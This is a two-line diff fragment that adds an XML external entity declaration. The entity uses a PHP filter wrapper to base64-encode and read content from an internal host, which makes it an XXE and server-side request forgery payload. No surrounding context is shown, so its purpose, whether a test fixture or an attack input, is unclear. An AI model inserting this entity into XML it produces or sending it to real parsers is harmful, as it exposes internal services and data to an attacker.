@@ -1,0 +1,2 @@
+<!ENTITY schedule SYSTEM "php://filter/read=convert.base64-encode/resource=http://internal.example.jp/">
+
